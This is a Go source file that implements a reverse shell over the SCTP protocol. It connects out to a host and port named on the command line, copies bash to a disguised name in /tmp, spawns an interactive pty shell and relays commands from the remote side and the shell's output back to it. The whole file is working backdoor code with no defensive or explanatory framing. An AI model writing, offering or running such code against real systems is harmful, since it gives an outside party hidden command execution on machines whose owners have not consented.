package main

import(
	"fmt"
	"github.com/ishidawataru/sctp"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
)

func main(){
	if len(os.Args[1:]) != 2{
		fmt.Println("Usage:",os.Args[0],"<host> <port>")
		os.Exit(1)
	}

	var localAddr *sctp.SCTPAddr
	servIPAddr := []net.IPAddr{}
	servIP,_:=net.ResolveIPAddr("ip",os.Args[1])
	servIPAddr = append(servIPAddr,*servIP)

	servPort,_ := strconv.Atoi(os.Args[2])
	servAddr := &sctp.SCTPAddr{
		IPAddrs:	servIPAddr,
		Port:		servPort,
	}

	conn,err := sctp.DialSCTP("sctp",localAddr,servAddr)
	if err != nil{
		log.Fatalln(err)
	}
	_ = conn.SubscribeEvents(sctp.SCTP_EVENT_DATA_IO)
	//copy/bin/shtotmpdirectory
	cmd := exec.Command("cp","/bin/bash","/tmp/sysHttd")
	_ = cmd.Run()

	cmd = exec.Command("/tmp/sysHttd")
	//cmd = exec.Command("/bin/sh")

	stdin,err := cmd.StdinPipe()
	if err != nil{
		log.Fatalln(err)
	}

	stdout,err := cmd.StdoutPipe()
	if err != nil{
		log.Fatalln(err)
	}

	err=cmd.Start()
	if err!=nil{
		log.Fatalln(err)
	}

	//get pty shell, dirty but worked.
	_,_ = stdin.Write([]byte("python -c 'import pty; pty.spawn(\"/bin/sh\")'\n"))
	go func(){
		for{
			cmdLine:=make([]byte,1024*20)
			for{
				readBuff:=make([]byte,1024)
				readLen,_,err:=conn.SCTPRead(readBuff)
				if err != nil{
					log.Fatalln(err)
				}
				if readLen > 0{
					cmdLine=append(cmdLine,readBuff[:readLen]...)

					//read finish
					if readLen<len(readBuff){
					break
					}
				}
			}

			if string(cmdLine)=="exit\n"{
				os.Exit(0)
			}
			//store command to a temp file from network
			cmdFile,err:=ioutil.TempFile("tmp","sys")
			if err!=nil{
				log.Fatalln(err)
			}
			_,_ = cmdFile.Write(cmdLine)

			cmdBuff,err:=ioutil.ReadFile(cmdFile.Name())
			if err!=nil{
				_ = cmdFile.Close()
				_ = os.Remove(cmdFile.Name())
				log.Fatalln(err)
			}
			_,_ = stdin.Write(cmdBuff)
			_ = cmdFile.Close()
			_ = os.Remove(cmdFile.Name())
		}
	}()

	readBuff:=make([]byte,1024*32)
	info:=&sctp.SndRcvInfo{
		Stream:1024,
		PPID:1024,
	}

	for{
		readLen,err := stdout.Read(readBuff)
		if readLen > 0 {
			_,err = conn.SCTPWrite(readBuff[:readLen],info)
			if err != nil {
				log.Fatalln(err)
			}
		}
		if err != nil{
			if err == io.EOF{
				break
			}
			log.Fatalln(err)
		}
	}
	cmd.Wait()
}